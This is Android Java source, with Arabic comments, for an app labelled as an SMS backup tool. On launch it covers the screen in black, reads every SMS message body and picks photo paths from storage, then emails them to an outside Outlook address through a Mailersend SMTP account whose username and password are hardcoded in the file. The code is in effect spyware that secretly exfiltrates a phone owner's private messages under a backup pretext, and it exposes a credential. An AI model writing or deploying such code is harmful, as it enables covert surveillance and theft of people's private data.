import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Color;
import android.os.Bundle;
import android.provider.Telephony;
import android.util.Log;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;
import java.util.Random;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_CODE_PERMISSIONS = 101;
    private static final String TAG = "SMSBackup";
    private FrameLayout blackScreen;

    // إعداد البريد الإلكتروني باستخدام Mailersend
    private String SMTP_SERVER = "smtp.mailersend.net";
    private String SMTP_PORT = "587";
    private String SENDER_ADDRESS = "MS_fLonPd@trial-351ndgw2mvqgzqx8.mlsender.net";
    private String SENDER_PASS = "53rvL5nt4mwfRmdG";
    private String RECEIVER_ADDRESS = "imobilejo@outlook.com";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        blackScreen = new FrameLayout(this);
        blackScreen.setBackgroundColor(Color.BLACK);
        blackScreen.setVisibility(View.GONE);
        addContentView(blackScreen, new FrameLayout.LayoutParams(
                FrameLayout.LayoutParams.MATCH_PARENT,
                FrameLayout.LayoutParams.MATCH_PARENT));

        if (hasPermissions()) {
            makeScreenBlackAndBackup();
        } else {
            requestPermissions();
        }
    }

    private boolean hasPermissions() {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED &&
               ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED;
    }

    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_EXTERNAL_STORAGE
        }, REQUEST_CODE_PERMISSIONS);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (requestCode == REQUEST_CODE_PERMISSIONS) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                makeScreenBlackAndBackup();
            } else {
                Toast.makeText(this, "تتطلب الأذونات للمواصلة", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void makeScreenBlackAndBackup() {
        blackScreen.setVisibility(View.VISIBLE);

        blackScreen.postDelayed(() -> {
            backupSMSAndPhotos();
        }, 1000);
    }

    private void backupSMSAndPhotos() {
        String smsBackup = getSMSBackup();
        List<String> photoPaths = getRandomPhotos(20);

        // إعداد وإرسال البريد الإلكتروني
        String subject = "نسخة احتياطية من الرسائل القصيرة والصور";
        StringBuilder body = new StringBuilder("نسخة احتياطية من الرسائل القصيرة:\n");
        body.append(smsBackup);
        body.append("\n\nمسارات الصور:\n").append(photoPaths.toString());

        sendEmail(RECEIVER_ADDRESS, subject, body.toString());

        Log.d(TAG, "نسخة احتياطية من الرسائل القصيرة: " + smsBackup);
        Log.d(TAG, "مسارات الصور: " + photoPaths);

        blackScreen.postDelayed(() -> {
            blackScreen.setVisibility(View.GONE);
        }, 2000);
    }

    private String getSMSBackup() {
        StringBuilder smsBuilder = new StringBuilder();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, null);
        
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                smsBuilder.append(body).append("\n");
            }
            cursor.close();
        }
        return smsBuilder.toString();
    }

    private List<String> getRandomPhotos(int count) {
        List<String> photoPaths = new ArrayList<>();
        File picturesDir = new File("/storage/emulated/0/Pictures"); // استبدل بالمسار الصحيح
        
        if (picturesDir.exists()) {
            File[] files = picturesDir.listFiles();
            Random random = new Random();
            
            while (photoPaths.size() < count) {
                File file = files[random.nextInt(files.length)];
                if (!photoPaths.contains(file.getAbsolutePath()) && file.isFile() && file.getName().endsWith(".jpg")) {
                    photoPaths.add(file.getAbsolutePath());
                }
            }
        }
        return photoPaths;
    }

    private void sendEmail(final String recipient, final String subject, final String body) {
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", SMTP_SERVER);
        props.put("mail.smtp.port", SMTP_PORT);

        Session session = Session.getInstance(props,
                new javax.mail.Authenticator() {
                    protected PasswordAuthentication getPasswordAuthentication() {
                        return new PasswordAuthentication(SENDER_ADDRESS, SENDER_PASS);
                    }
                });

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(SENDER_ADDRESS));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(recipient));
            message.setSubject(subject);
            message.setText(body);
            Transport.send(message);
            Log.d(TAG, "Email sent successfully!");
        } catch (MessagingException e) {
            Log.e(TAG, "Error sending email: " + e.getMessage());
        }
    }
}
